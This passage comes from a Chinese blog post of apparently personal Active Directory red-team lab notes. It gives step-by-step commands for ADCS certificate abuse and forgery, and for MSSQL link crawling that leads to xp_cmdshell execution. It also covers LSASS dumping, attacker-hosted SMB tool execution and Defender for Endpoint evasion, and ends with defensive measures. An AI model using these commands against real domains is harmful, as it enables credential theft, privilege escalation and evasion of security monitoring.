<li>CA —— 颁发证书的认证机构，在adcs的情况下具有adcs规则的服务器即为CA（不过现在基本都在DC上了）</li>
<li>Certificate —— 证书可以被视为颁发给用户、机器的一段代码，它用于验证身份、加密、签署文件等</li>
<li>CSR —— 证书签名请求，是指客户端向CA发起的证书签名请求，用于请求证书。</li>
<li>Certificate Template —— 证书模板，定义证书的设置，包含：证书何时到期，谁可以注册，谁可以为了什么申请证书，这张证书用于做什么，用于身份验证还是加密文件等等，包含了对一个证书的定义。</li>
<li>EKU OIDs —— 全称是 <code>Extended Key Usages Object Identifiers</code> ,定义了证书的用途：身份验证、智能卡、文件加密等等，这个通常包含在证书模板里。</li>
</ul>
<h3 id="1-流程"><a href="#1-流程" class="headerlink" title="1.流程"></a>1.流程</h3><ul>
<li>1.客户端生成一个公私钥对</li>
<li>2.向企业CA 发送证书签名请求（CSR）</li>
<li>3.CA检查证书模板是否存在，CSR中的设置是否被证书模板所允许，用户是否被允许注册这个证书</li>
<li>4.CA确定ok后，会用CA私钥对这张证书签名，然后将其发送给用户</li>
<li>5.客户端将证书存储在Windows证书存储中，用户然后做符合EKU OID行为的时候会用到这个证书。</li>
</ul>
<h3 id="2-利用点"><a href="#2-利用点" class="headerlink" title="2.利用点"></a>2.利用点</h3><p>比较多</p>
<ul>
<li>通过证书提取目标nthash</li>
<li>证书默认过期时间是一年，即便用户改掉了自己账户密码，证书也依旧可以用，所以用来持久化</li>
<li>用来提权</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>窃取证书</th>
<th>持久化</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>使用windows加密API导出私钥和证书</td>
<td>如果对一个证书有注册权限，可以通过请求新证书来保证用户权限维持</td>
</tr>
<tr>
<td>2</td>
<td>使用DPAPI提取用户证书及其私钥</td>
<td>通过请求新的证书来实现主机持久化</td>
</tr>
<tr>
<td>3</td>
<td>使用DPAPI提取机器证书及其私钥</td>
<td>通过续期证书，实现对用户或机器账户的持久化控制</td>
</tr>
<tr>
<td>4</td>
<td>如果证书标记为可导出，则可通过powershell等从文件和存储中导出PFX证书</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>使用PKINIT获取ntlmhash</td>
<td></td>
</tr>
</tbody></table>
<p>以及，如果泄露了CA私钥，将可以使用其解密所有证书，然后导出他颁发的所有证书。</p>
<p>然后是配置错误等导致的，ESC1-ESC15</p>
<table>
<thead>
<tr>
<th>ESC1</th>
<th>ESC2</th>
<th>ESC3</th>
</tr>
</thead>
<tbody><tr>
<td>申请者（Enrollee）可以为任意用户申请证书，并且当前还有这个证书的注册权限。（需要注意EKU的范围，或者没有）</td>
<td>允许被用于任何目的，或者没有EKU（会被应用于任何场景）</td>
<td>请求一个注册代理证书（Enrollment Agent Certificate），然后用它代表任意用户申请证书。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ESC4</th>
<th>ESC5</th>
<th>ESC6</th>
</tr>
</thead>
<tbody><tr>
<td>过度允许的在模板上使用ACL（导致修改模板）</td>
<td>对证书颁发机构（CA 服务器）或其计算机对象的访问控制配置不当。</td>
<td>CA 启用了EDITF_ATTRIBUTE_SUBJECTALTNAME2，攻击者模仿用户（比如域管）的 SAN，申请用于身份认证的证书，伪装成任何人登录域。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ESC7</th>
<th>ESC8</th>
<th>ESC9</th>
</tr>
</thead>
<tbody><tr>
<td>对 CA 权限角色（比如 CA Administrator 和 Certificate Manager）的访问控制配置不严格、不安全。</td>
<td>中继NTLM请求到http的证书注册端点</td>
<td>在没有安全拓展的情况下攻击者修改自己的UPN和用户名，以伪造身份代表任何用户请求证书</td>
</tr>
</tbody></table>
<p>实际比较常见的ESC是：1、3、4、5、7、8</p>
<p>接下来的都是特定情况下的</p>
<blockquote>
<p>证书有显式映射与隐式映射</p>
</blockquote>
<table>
<thead>
<tr>
<th>ESC10</th>
<th>ESC11</th>
<th>ESC12</th>
</tr>
</thead>
<tbody><tr>
<td>如果存在隐式证书映射，则申请者可以修改自己的 UPN，从而代表任何用户申请证书（和ESC9有些类似）</td>
<td>NTLM中继到RPC注册端点（非默认开启）</td>
<td>从 Yubico 的 YubiHSM（硬件安全模块）里窃取 CA（证书颁发机构）的私钥。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ESC13</th>
<th>ESC14</th>
<th>ESC15</th>
</tr>
</thead>
<tbody><tr>
<td>证书模板配置了关联组，申请者有权申请这个证书，将获得与证书模板关联的安全组（linked group）的权限</td>
<td>利用证书会引用目标对象属性中的 altSecurityIdentities 字段，实现以该目标身份进行身份认证(HTB 的Scepter有用到)。</td>
<td>滥用旧版（版本1）证书模板可以绕过 EKU 限制，让证书用于更多不该有的身份验证等操作。</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-1-证书的权限维持"><a href="#2-1-证书的权限维持" class="headerlink" title="2.1 证书的权限维持"></a>2.1 证书的权限维持</h3><p>当对adcs主机有localadmin或其他高权限时，可以导出域证书私钥，用作权限维持与用户证书伪造。</p>
<p>通过 <code>certutil</code> 查看可用证书</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-Store</span> My</span><br></pre></td></tr></table></figure>

<p>导出目标证书私钥（注意需要根据情况来选择导出的证书）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-exportPFX</span> My xxxxxxxxx cert.pfx</span><br></pre></td></tr></table></figure>

<p>使用证书私钥签发目标用户的pfx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy forge -ca-pfx &quot;CA.pfx&quot; -upn &quot;administrator@corp.local&quot; -subject &quot;CN=Administrator,CN=Users,DC=CORP,DC=LOCAL&quot;</span><br></pre></td></tr></table></figure>

<p>后续访问使用签发出的证书即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx ./administrator_forged.pfx -username administrator -dc-ip 172.16.100.1</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>CA权限维持</strong></p>
<ul>
<li>伪造证书使用被盗的CA私钥密钥。</li>
<li>恶意的证书颁发机构恶意的根证书颁发机构（Root CA）或中间证书颁发机构（Intermediate CA）。</li>
<li>后门CA服务或后门CA机器。</li>
</ul>
<hr>
<h3 id="3-枚举ADCS"><a href="#3-枚举ADCS" class="headerlink" title="3.枚举ADCS"></a>3.枚举ADCS</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a></p>
</blockquote>
<p>在当前林中枚举ADCS</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe cas</span><br></pre></td></tr></table></figure>

<p>枚举证书模板</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find</span><br></pre></td></tr></table></figure>

<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainObject</span> <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=moneycorp,DC=local&quot;</span> <span class="literal">-Properties</span> *</span><br></pre></td></tr></table></figure>

<p>枚举可能存在漏洞的证书</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnertable</span><br></pre></td></tr></table></figure>

<p>枚举当前用户能够申请的证书（包含当前用户组的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /currentuser </span><br></pre></td></tr></table></figure>

<p>枚举ESC1 （为任何用户申请证书）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /enrolleeSuppliesSubject</span><br></pre></td></tr></table></figure>

<h3 id="4-利用示例"><a href="#4-利用示例" class="headerlink" title="4.利用示例"></a>4.利用示例</h3><p>利用ESC1 申请一张administrator的证书</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local moneycorp<span class="literal">-MCORP-DC-CA</span> /template:<span class="string">&quot;HTTPscertificates&quot;</span></span><br><span class="line">/altname:administrator</span><br></pre></td></tr></table></figure>

<p>将证书复制下来到txt中，然后通过openssl转换为fpx，会需要输入密码，一会rubeus用的时候也要附上密码（转换的方式比较多，看个人喜好了，我习惯openssl和certipy轮换着用）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl.exe pkcs12 C:\AD\Tools\esc1.pem <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx</span><br></pre></td></tr></table></figure>

<p>使用pfx证书，请求tgt注入到进程中</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx /password:test@<span class="number">123</span> /ptt</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>ESC1 提权至企业管理员</strong></p>
<p>和刚才管理员是一样的，只不过altname需要指定为林根域的administrator</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe request /ca:mcorp<span class="literal">-dc</span>.moneycorp.local moneycorp<span class="literal">-MCORP-DC-CA</span> /template:<span class="string">&quot;HTTPscertificates&quot;</span></span><br><span class="line">/altname:moneycorp.local\administrator</span><br></pre></td></tr></table></figure>

<p>后面还是一样的，转换pfx，然后请求TGT注入进程</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl.exe pkcs12 C:\AD\Tools\esc1.pem <span class="literal">-keyex</span> <span class="literal">-CSP</span> <span class="string">&quot;Microsoft Enhanced cryptographic Provider v1.0&quot;</span> <span class="literal">-export</span> <span class="literal">-out</span> C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx</span><br></pre></td></tr></table></figure>

<p>使用pfx证书，请求tgt注入到进程中，因为是要和林域交互，所以注意这里user也需要指定为林根的user，以及dc这里也需要指定到林根的dc，才能获取到林根的企业管理员administator。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:moneycorp.local\administrator /dc:mcorp<span class="literal">-dc</span>.moneycorp.local /certificate:C:\AD\Tools\esc1<span class="literal">-DA</span>.pfx /password:test@<span class="number">123</span> /ptt</span><br></pre></td></tr></table></figure>

<p>然后就可以访问林根的dc了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:mcorp<span class="literal">-dc</span> cmd</span><br></pre></td></tr></table></figure>

<h2 id="11-SQL-server-Trust-Abuse"><a href="#11-SQL-server-Trust-Abuse" class="headerlink" title="11.SQL server Trust Abuse"></a>11.SQL server Trust Abuse</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/NetSPl/PowerUpSQL">https://github.com/NetSPl/PowerUpSQL</a></p>
</blockquote>
<p>在拿到一个数据库的时候按理说应该更关注数据库的数据（笑</p>
<p>通过SPN枚举发现sql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure>

<p>连接尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</span><br></pre></td></tr></table></figure>

<p>获取server信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose</span><br></pre></td></tr></table></figure>

<h3 id="1-存在利用点"><a href="#1-存在利用点" class="headerlink" title="1.存在利用点"></a>1.存在利用点</h3><p><code>database link</code>，在当前数据库中可能会有到另一个数据库的链接，而这个到另一个数据库的链接可能会是一个高权用户的。</p>
<p>而且在多个数据库串到一起的情况下危害可能更大，比如这里的例子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通用户-&gt;数据库A---&gt;link database admin---&gt;数据库b ---&gt;link database As---&gt;数据库C</span><br></pre></td></tr></table></figure>

<p>而且即便是跨林，林的安全边界对于这种情况毫无影响。</p>
<p>用gui的话是</p>
<p>查询链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master..sysservers</span><br></pre></td></tr></table></figure>

<p>执行链接对端数据库的查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openquery(&quot;DCORP-SQL1&quot;,&#x27;select * from master..sysservers&#x27;)</span><br></pre></td></tr></table></figure>

<p>嵌套</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openquery(&quot;DCORP-SQL1&quot;,&#x27;select * from openquery(&quot;DCORP-MGMT&quot;,&#x27;&#x27;select * from master..sysservers&#x27;&#x27;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>用powerupsql的话如下</p>
<p>查询数据库链接的方式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLServerLink</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>或者直接查</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> master..sysservers</span><br></pre></td></tr></table></figure>

<p>查到了的话就可以通过语句指定链接名狠狠的查对面数据库有没有link</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from master..sysservers&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后再套娃查（注意转义单引号）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from openquery(&quot;dcorpmgmt&quot;,&quot;select * from master..sysservers&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>如果不想手动套娃的话可以用，PowerUpSQL这个函数，让他自动套娃查</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLServerLinkCrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>数据库链接时候访问链接对面库的密码会在本地。</p>
<p><strong>执行命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE(&#x27;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#x27;) AT &quot;eu-sql&quot;</span><br></pre></td></tr></table></figure>

<p>在手动套娃的情况下执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> openquery(&quot;dcorp-sql1&quot;,<span class="string">&#x27;select * from openquery(&quot;dcorp-mgmt&quot;,&quot;select * from openquery(&quot;eu-sql.eu.eurocorp.local&quot;,&quot;&#x27;</span><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">as</span> version;<span class="keyword">exec</span> master..xp cmdshell &quot;powershell whoami)&#x27;&#x27;&#x27;&#x27;)&quot;)<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>还是自动套娃执行吧（如果不指定<code>-QueryTarget</code>参数他将在所有database的link节点都执行这个）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&quot;exec master..xp_cmdshell &#x27;whoami&#x27;&quot;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="12-MDE"><a href="#12-MDE" class="headerlink" title="12.MDE"></a>12.MDE</h2><h3 id="minidump"><a href="#minidump" class="headerlink" title="minidump"></a>minidump</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/WhiteOakSecurity/MiniDumpDotNet">https://github.com/WhiteOakSecurity/MiniDumpDotNet</a></p>
</blockquote>
<p>通过自定义的API来实现minidump，从而来对MDE进行绕过</p>
<p>这个工具需要lsass的pid，那如何获取lsass的pid。</p>
<p><code>tasklist /v</code> 是不行了，mde会检测这个命令并告警。</p>
<p>建议用winapi来实现，或者如果有RDP的话用任务管理器也ok。</p>
<p>当然如果直接把把这个查询pid的功能集成到minidumpdotnet中，mde将会告警。</p>
<p>所以他必须作为一个独立的exe或者别的而存在。</p>
<h3 id="工具传输落地"><a href="#工具传输落地" class="headerlink" title="工具传输落地"></a>工具传输落地</h3><p>很多 EDR 会监控网络下载行为，特别是从 Internet 上下载 .exe、.dll、.bat 这类可疑文件，风险很高。</p>
<p>利用系统自带的“合法软件”下载东西，比如 msedge.exe、bitsadmin、certutil，可以绕过很多 EDR 的规则（叫 LOLBins —— Living Off the Land Binaries）。</p>
<p>另一个安全性更高（隐蔽性更好）的方式是使用 SMB 文件共享。可以直接从一个可读取的共享目录中运行程序，这比传统的下载并执行方式风险小很多。</p>
<p>比如把文件放在某个 SMB 共享（如攻击者自己的共享目录），然后目标机器可以通过 \attacker\share\tool.exe 来直接访问甚至运行。</p>
<p>这样不会产生明显的网络下载行为，也避开很多流量监控系统。</p>
<h3 id="打破检测链"><a href="#打破检测链" class="headerlink" title="打破检测链"></a>打破检测链</h3><p>如果在一条条执行可疑命令，将会逐渐降低当前edr对你的可信度。</p>
<p>建议是执行一条可疑的命令之后来点正常的命令。</p>
<p>或者每次执行间隔时间长一些，比如10分钟左右再进行下一次。</p>
<h3 id="ASR绕过"><a href="#ASR绕过" class="headerlink" title="ASR绕过"></a>ASR绕过</h3><p>通过<code>GetCommandLineExclusions</code>查看被排除的关键字，只要命令行里有这里面包含的关键字，就可以绕过，或者命令行伪装路径</p>
<p>避免执行whoami这样的命令 都会被edr捕获到。</p>
<h3 id="重新做一遍11-sqlserver，采用基于opsec绕过mde的做法"><a href="#重新做一遍11-sqlserver，采用基于opsec绕过mde的做法" class="headerlink" title="重新做一遍11.sqlserver，采用基于opsec绕过mde的做法"></a>重新做一遍11.sqlserver，采用基于opsec绕过mde的做法</h3><p>把 <code>findlsasspid.exe</code> 放到smb的目录共享中。</p>
<p>然后在目标机器上通过smb直接执行exe，获取到lsass的pid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&quot;exec master..xp_cmdshell &#x27;\\dcorp-student1.dollarcorp.moneycorp.local\FindLassPid.exe&#x27;&quot;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>

<p>再执行一个相对正常的命令，尝试打破mde的检测链</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&#x27;select @@version&#x27;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>

<p>然后进行提取，并将dump出的dmp放到我们的smb下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SQLserverLinkcrawl</span> <span class="literal">-Instance</span> dcorp<span class="literal">-mssql</span> <span class="literal">-Query</span> <span class="string">&#x27;exec master..xp_cmdshell &#x27;</span><span class="string">&#x27;\\dcorp-student1.dollarcorp.moneycorp.local\minidumpdotnet.exe 696 \\dcorp-student1.dollarcorp.moneycorp.local\test.dmp&#x27;</span><span class="string">&#x27; &#x27;</span> <span class="literal">-QueryTarget</span> eu<span class="literal">-sql</span></span><br></pre></td></tr></table></figure>

<p>得到dmp后就可以在本地加载dmp了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::evasive-minidump C:\tools\ad\test.dmp&quot;</span> <span class="string">&quot;sekurlsa::evasive-keys&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用对应的用户aeskey，请求的tgt注入当前进程，因为目标用户在eurocorp那的林根所以需要指定林根域和其dc来向另一个域的DC请求这张票据。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dbadmin /aes256:xxxx /domain:eu.eurocorp.local /dc:eu<span class="literal">-dc</span>.eurocorp.local /opsec /createnetonly:C:\windwos\system32\cmd.exe /ptt /show</span><br></pre></td></tr></table></figure>

<p>然后远程到目标机器就完事</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:eu<span class="literal">-sql1</span>.eu.eurocorp.local</span><br></pre></td></tr></table></figure>

<h1 id="13-检测与防御"><a href="#13-检测与防御" class="headerlink" title="13.检测与防御"></a>13.检测与防御</h1><h3 id="保护并限制域管理员"><a href="#保护并限制域管理员" class="headerlink" title="保护并限制域管理员"></a>保护并限制域管理员</h3><p>域管不应当有权限登录到除了DC之外的机器，没必要使用域管来执行日常的管理任务等.</p>
<p>以及不要用DA权限在其他任何机器运行服务。</p>
<p>对于一个中大型规模公司应当只有2-3个域管理员。</p>
<h3 id="Protected-Users-Group"><a href="#Protected-Users-Group" class="headerlink" title="Protected Users Group"></a>Protected Users Group</h3><p>受保护的组用户，其凭据将不会以不安全(明文)的方式缓存。</p>
<p>并且受保护的用户无法使用CredSSP 以及 WDigest的方式登陆到机器，所以也就自然不会缓存NTLMhash</p>
<p>然后kerberos不会使用des和rc4这样的方式进行认证，也就是常说的 <code>关闭了NTLM认证</code> ，因此pre-auth的kerberoasting 将无法使用。</p>
<p>TGT票据的初始寿命会只有四小时，而且无法修改最大时间。</p>
<p>而且受保护的用户无法被使用委派。</p>
<p>服务账户和主机账户没有必要添加到这个组内，因为服务账户的明文凭据将会被存在对应运行着服务的主机上，所以<strong>不要用DA账户在其他机器上运行服务</strong>。</p>
<hr>
<h3 id="Privileged-Administrative-Workstations-PAWs"><a href="#Privileged-Administrative-Workstations-PAWs" class="headerlink" title="Privileged Administrative Workstations (PAWs)"></a>Privileged Administrative Workstations (PAWs)</h3><p>paw实质上是一个经过加固的工作站，用于执行敏感任务，例如管理域控制器、云基础设施和关键业务功能等。</p>
<p>能够防御钓鱼攻击、操作系统漏洞利用、凭据重放攻击等。</p>
<p>管理跳板机（Jump Server）只能通过 PAW 来访问，并可采用多种策略：</p>
<ul>
<li><p>将管理任务与日常任务在权限和硬件上分离</p>
</li>
<li><p>在 PAW 上运行一个虚拟机（VM）来处理普通用户任务</p>
</li>
</ul>
<hr>
<h3 id="LAPS-Local-Administrator-Password-solution"><a href="#LAPS-Local-Administrator-Password-solution" class="headerlink" title="LAPS (Local Administrator Password solution)"></a>LAPS (Local Administrator Password solution)</h3><p><code>Windows LAPS</code> 会定期为每台计算机的本地管理员账户生成随机密码，并将密码存储在 AD 中，统一管理。</p>
<p>对这些密码的读取权限是受控制的（即必须设置特定的 AD 权限，谁能读取密码是可控的）。</p>
<p>这些密码保存在对应受账户的 <code>ms-MCS-AdmPwd</code> 属性中，什么时候换密码由 <code>ms-MCS-AdmPwdExpirationTime</code> 控制。</p>
<p>虽然密码是明文存储的，但传输过程是加密的（比如使用 LDAP over SSL&#x2F;TLS）。</p>
<p>攻击者如果已经入侵 AD，可以通过权限分析工具找出有读取 <code>ms-MCS-AdmPwd</code> 权限的账号，从而进一步横向移动攻击。</p>
<p>如果某个用户有权限读取所有域内计算机的LAPs的管理员密码，那照样G了。</p>
<hr>
<h3 id="Time-Bound-Administration-——-JIT"><a href="#Time-Bound-Administration-——-JIT" class="headerlink" title="Time Bound Administration —— JIT"></a>Time Bound Administration —— JIT</h3><p>基于时间的权限管理（Just-In-Time 管理）</p>
<p>简单来说，只在“需要时”才赋予用户临时的管理员权限，并且权限在设定时间后会自动失效。</p>
<p>在 <code>Windows Server 2016</code> 及之后版本中，你可以设置一个用户临时加入某个组（比如 Domain Admins），并在设定时间后自动移除。</p>
<p>使用此功能需要启用“特权访问管理（PAM）功能”，启用后不能关闭。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Members</span> newDA <span class="literal">-MemberTimeToLive</span> (<span class="built_in">New-TimeSpan</span> <span class="literal">-Minutes</span> <span class="number">60</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Time-Bound-Administration-JEA"><a href="#Time-Bound-Administration-JEA" class="headerlink" title="Time Bound Administration - JEA"></a>Time Bound Administration - JEA</h2><p>基于时间或作用范围的权限管理 - JEA</p>
<p>JEA 提供了基于角色的访问控制 可以让非管理员用户通过 PowerShell 远程执行特定的管理任务，但只限于他们被允许执行的任务（最小权限原则）。</p>
<p>例如，可以控制用户能运行哪些命令，甚至限制命令能使用哪些参数：</p>
<blockquote>
<p>你可以配置某个用户只能运行 Restart-Service，而且只能重启名为 Spooler 的服务，别的命令和服务都不能动。</p>
</blockquote>
<p>JEA &#x3D; 远程 PowerShell 的最小权限控制 + 命令审计 + 精细化授权机制</p>
<p>有用到这个的靶机 <a target="_blank" rel="noopener" href="https://flowerwitch.github.io/2025/03/13/Tracks-AD-Acute/">HTB-Acute</a></p>
<p>下面是一个实例，创建了一个策略，允许用户运行 <code>Get-Service</code> 命令（并限制只可使用 <code>-Name</code> 参数）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-PSRoleCapabilityFile</span> <span class="literal">-Path</span> (<span class="built_in">Join-Path</span> <span class="variable">$rolecapabilityPath</span> <span class="string">&quot;services.psrc&quot;</span>) <span class="literal">-Description</span> <span class="string">&quot;Allows checking services.&quot;</span> <span class="literal">-CompanyName</span> <span class="string">&quot;Alt&quot;</span> <span class="literal">-Author</span> <span class="string">&quot;Admin&quot;</span> <span class="literal">-ModulesToImport</span> <span class="string">&quot;Microsoft.PowerShell.Core&quot;</span> <span class="literal">-VisibleCmdlets</span> <span class="selector-tag">@</span>&#123; Name = <span class="string">&#x27;Get-Service&#x27;</span>; Parameters = <span class="selector-tag">@</span>&#123; Name = <span class="string">&#x27;Name&#x27;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>还有几步懒得写了</p>
<p>用的时候要指定 <code>-ConfigurationName</code> 参数</p>
<h2 id="Detection-and-Defense-ESAE"><a href="#Detection-and-Defense-ESAE" class="headerlink" title="Detection and Defense - ESAE"></a>Detection and Defense - ESAE</h2><p>ESAE（Enhanced Security Administrative Environment）增强安全管理环境<br>是一种设计架构，专门为管理关键资产（比如域控、管理员账号、敏感服务器）而建立一个独立的“管理森林”。</p>
<p>建立一个专门的 Active Directory 森林，只用来做管理工作，叫做 “Red Forest（红色森林）”</p>
